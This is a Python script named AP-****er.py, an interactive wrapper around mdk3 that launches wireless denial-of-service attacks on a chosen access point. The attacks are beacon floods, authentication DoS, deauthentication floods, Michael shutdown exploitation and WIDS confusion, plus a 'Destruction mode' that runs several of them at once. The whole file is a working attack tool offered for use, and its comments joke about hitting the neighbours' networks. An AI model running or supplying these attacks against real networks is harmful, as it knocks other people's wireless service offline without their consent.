#!/usr/bin/env python 
# -*- coding: Utf-8 -*- 
# 
# WIRELESS ACCESS POINT ****ER 
# Interactive, Multifunction, Destruction Mode Included 
# Name: AP-****er.py
# Version: 0.4 
# Coded by: MatToufoutu 
# 
# Thanks to BackTrack crew, especially ShamanVirtuel for his help and ASPJ for creating mdk3
# 
# USAGE: Launch the script as root using "python AP-****er.py", follow instructions, enjoy! 
# Prerequisites: Have mdk3 installed 
# 
 
### IMPORTS 
import commands, os 
from sys import stdout, exit 
from threading import Thread 
from time import sleep, ctime 
try: 
    import psyco 
    psyco.profile() 
except ImportError: 
    pass
 
### MDK3 THREADED ATTACKS CLASS 
class mdk3(Thread): 
    def __init__(self, attack, attack_options): 
        Thread.__init__(self) 
        self.attack = attack 
        self.iface = attack_options[0] 
        self.essid = attack_options[1] 
        self.bssid = attack_options[2] 
        self.chan = attack_options[3] 
        self.log = "ap****er.log" 
    def bflood(self): 
        out = open(self.log,"a") 
        out.write("\n ----- "+ctime()+" : Launching beacon flood against %s on channel %s -----" % (self.essid, self.chan)) 
        out.close() 
        print("\n Launching beacon flood against %s on channel %s" % (self.essid, self.chan)) 
        sleep(2) 
        os.system("mdk3 "+self.iface+" b -n "+self.essid+" -g -w -m -c "+self.chan+" >> "+self.log) 
    def ados(self): 
        out = open(self.log,"a") 
        out.write("\n ----- "+ctime()+" : Launching Auth DoS against %s -----" % (self.bssid)) 
        out.close() 
        print("\n Launching Auth DoS against %s " % (self.bssid)) 
        sleep(2) 
        os.system("mdk3 "+self.iface+" a -i "+self.bssid+" -m -s 1024 >> "+self.log) 
    def amok(self): 
        out = open(self.log,"a") 
        out.write("\n ----- "+ctime()+" : Launching Deauth Flood 'Amok' Mode on channel %s -----" % (self.chan)) 
        out.close() 
        print("\n Launching Deauth Flood 'Amok' Mode on channel %s" % (self.chan)) 
        sleep(2) 
        os.system("mdk3 "+self.iface+" d -c "+self.chan+" -s 1024 >> "+self.log) 
    def mich(self): 
        out = open(self.log,"a") 
        out.write("\n ----- "+ctime()+" : Launching Michael 'Shutdown' Exploitation against %s on channel %s -----" % (self.bssid, self.chan)) 
        out.close() 
        print("\n Launching Michael 'Shutdown' Exploitation against %s on channel %s" % (self.bssid, self.chan)) 
        sleep(2) 
        os.system("mdk3 "+self.iface+" m -t "+self.bssid+" -j -w 1 -n 1024 -s 1024 >> "+self.log) 
    def wids(self): 
        out = open(self.log,"a") 
        out.write("\n ----- "+ctime()+" : Launching WIDS Confusion against %s on channel %s -----" % (self.essid, self.chan)) 
        out.close() 
        print("\n Launching WIDS Confusion against %s on channel %s" % (self.essid, self.chan)) 
        sleep(2) 
        os.system("mdk3 "+self.iface+" w -e "+self.essid+" -c "+self.chan+" >> "+self.log) 
    def run(self): 
        if self.attack == "B": 
            self.bflood() 
        if self.attack == "A": 
            self.ados() 
        if self.attack == "D": 
            self.amok() 
        if self.attack == "M": 
            self.mich() 
        if self.attack == "W": 
            self.wids() 
 
### AUXILIARY FUNCTIONS 
## CHECK IF IFACE IS IN MONITOR MODE 
def check_mon(iface): 
    for line in commands.getoutput("iwconfig "+iface).splitlines(): 
        if "Mode:Monitor" in line: 
            return True 
    return False 
 
## CHECK IF BSSID IS VALID 
def check_mac(ap): 
    if len(ap) != 17 or ap.count(':') != 5: 
        return False 
    macchar="0123456789abcdef:" 
    for c in ap.lower(): 
        if macchar.find(c) == -1: 
            return False 
    return True 
 
## CHECK IF CHANNEL IS VALID 
def check_chan(iface, chan): 
    if chan.isdigit(): 
        channel=int(chan) 
        if not channel in range(1, int(commands.getoutput("iwlist "+iface+" channel | grep channels | awk '{print $2}'"))+1): 
            return False 
    else: 
        return False 
    return True 
 
## CLEAN EXIT 
def clean_exit(): 
    print;print 
    print("\nAction aborted by user. Exiting now") 
    for pid in commands.getoutput("ps aux | grep mdk3 | grep -v grep | awk '{print $2}'").splitlines(): 
        os.system("kill -9 "+pid) 
    print("Hope you enjoyed it ;-)") 
    sleep(3) 
    os.system("clear") 
    exit(0) 
 
## DUMMY WAITING MESSAGE (ANIMATED) 
def waiter(mess): 
    try: 
        stdout.write("\r | "+mess) 
        stdout.flush() 
        sleep(0.15) 
        stdout.write("\r / "+mess) 
        stdout.flush() 
        sleep(0.15) 
        stdout.write("\r-- "+mess) 
        stdout.flush() 
        sleep(0.15) 
        stdout.write("\r \\ "+mess) 
        stdout.flush() 
        sleep(0.15) 
        stdout.write("\r | "+mess) 
        stdout.flush() 
        sleep(0.15) 
        stdout.write("\r / "+mess) 
        stdout.flush() 
        sleep(0.15) 
        stdout.write("\r-- "+mess) 
        stdout.flush() 
        sleep(0.15) 
        stdout.write("\r \\ "+mess) 
        stdout.flush() 
        sleep(0.15) 
    except KeyboardInterrupt: 
        clean_exit() 
 
### MAIN APP 
attackAvail = ["B", "A", "W", "D", "M", "T"] 
attack_opt=[] 
 
if commands.getoutput("whoami") != "root": 
    print("This script must be run as root !") 
    exit(0) 
try: 
    os.system("clear") 
    print("\n\t\t########## ACCESS POINT F.U.C.K.E.R ##########\n") 
    print("Choose your Mode:\n\t - (B)eacon flood\n\t - (A)uth DoS\n\t - (W)ids confusion\n\t - (D)isassociation 'AmoK Mode'\n\t - (M)ichael shutdown exploitation\n\t - Des(T)ruction mode (USE WITH CAUTION)\n") 
     
    ## GET MODE 
    while 1: 
        mode = raw_input("\n>>> ") 
        if mode.upper() not in attackAvail: 
            print("  '%s' is not a valid mode !" % mode) 
        else: 
            break 
 
    ## GET INTERFACE 
    while 1: 
        iface = raw_input("\nMonitor interface to use: ") 
        if check_mon(iface): 
            attack_opt.append(iface) 
            break 
        else: 
            print("%s is not a Monitor interface, try again or hit Ctrl+C to quit" % iface) 
 
    ## GET ESSID 
    if mode.upper() == "B" or mode.upper() == "W" or mode.upper() == "T": 
        attack_opt.append("\""+raw_input("\nTarget ESSID: ")+"\"") 
    else: 
        attack_opt.append(None) 
 
    ## GET BSSID 
    if mode.upper() == "A" or mode.upper() == "M" or mode.upper() == "T": 
        while 1: 
            bssid = raw_input("\nTarget BSSID: ") 
            if check_mac(bssid): 
                attack_opt.append(bssid) 
                break 
            else: 
                print("Invalid BSSID, try again or hit Ctrl+C to quit") 
    else: 
        attack_opt.append(None)  
 
    ## GET CHANNEL 
    if mode.upper() == "B" or mode.upper() == "D" or mode.upper() == "W" or mode.upper() == "T": 
        while 1: 
            channel = raw_input("\nTarget channel: ") 
            if check_chan(iface, channel): 
                attack_opt.append(channel) 
                break 
            else: 
                print("Channel can only be 1 to 14, try again or hit Ctrl+C to quit") 
    else: 
        attack_opt.append(None) 
 
    ## LAUNCH SELECTED ATTACK 
    if os.path.exists("ap****er.log"): 
        os.unlink("ap****er.log") 
    if mode.upper() != "T": 
        os.system('clear') 
        mdk3(mode.upper(), attack_opt).start() 
        sleep(1) 
        print; print; print 
        while 1: 
            waiter("   ATTACK IS RUNNING !!! HIT CTRL+C TWICE TO STOP THE TASK...") 
    else: 
        os.system('clear') 
        print("\n\t/!\\/!\\/!\\ WARNING /!\\/!\\/!\\\n") 
        print(" You've choosen DESTRUCTION MODE") 
        print(" Using this mode may harm your WiFi card, use it at your own risks.") 
        validate = raw_input(" Do you wish to continue? (y/N): ") 
        if validate.upper() != "Y": 
            print(" Ok, exiting now") 
            exit(0) 
        else: 
            out=open("ap****er.log","a") 
            out.write("\n ----- "+ctime()+" : Launching Destruction Combo. Target is AP %s|%s on channel %s -----" % (attack_opt[1], attack_opt[2], attack_opt[3])) 
            out.close() 
            print("\n Launching Destruction Combo\n Target is AP %s|%s on channel %s" % (attack_opt[1], attack_opt[2], attack_opt[3])) 
            print(" Please be kind with your neighbours xD") 
            mdk3("B", attack_opt).start() 
            mdk3("A", attack_opt).start() 
            mdk3("D", attack_opt).start() 
            mdk3("M", attack_opt).start() 
            ##wids may raise a segfault(internal mdk3 problem when multiple attacks apparently) 
            #mdk3("W",attack_opt).start() 
            sleep(1) 
            print; print; print 
            while 1: 
                waiter("   DESTRUCTION COMBO IS RUNNING !!! HIT CTRL+C TWICE TO STOP THE TASK...") 
except KeyboardInterrupt: 
    clean_exit()
